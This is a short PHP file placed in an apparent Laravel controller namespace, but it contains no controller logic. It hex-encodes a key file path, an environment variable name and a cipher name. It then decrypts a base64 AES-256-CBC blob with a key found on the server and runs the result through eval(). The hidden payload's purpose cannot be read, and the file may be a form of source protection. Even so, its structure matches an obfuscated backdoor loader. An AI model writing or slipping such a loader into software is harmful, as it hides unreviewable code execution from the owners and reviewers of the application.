<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('B2i8/7hhIPNfpHM7EK4ZGQ==');

$c=base64_decode(

'RXlfLV/jiuETbwxYPTbjWpjmBIuqlJiaOq8qODLQeN71s8uiqRa7GuImRmI53659dLZDueYEdm3F' .
'sy4oMC7W9uJ9YTW3NhLhX90E9nbKrcGVbRTohZ2no72IxdJSTmgwgacyPkt8+NpygzSeuL6+dkM3' .
'ODuui+/vhKCpUNBBWzJ396Vj/ytpyLMy/DaYlhyzFaCIVNPGW0c9W+53XUwayGCYYDagUhEgh1aP' .
'MOHjecC3EZLvgJO0WzXeKTQbRq8o'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

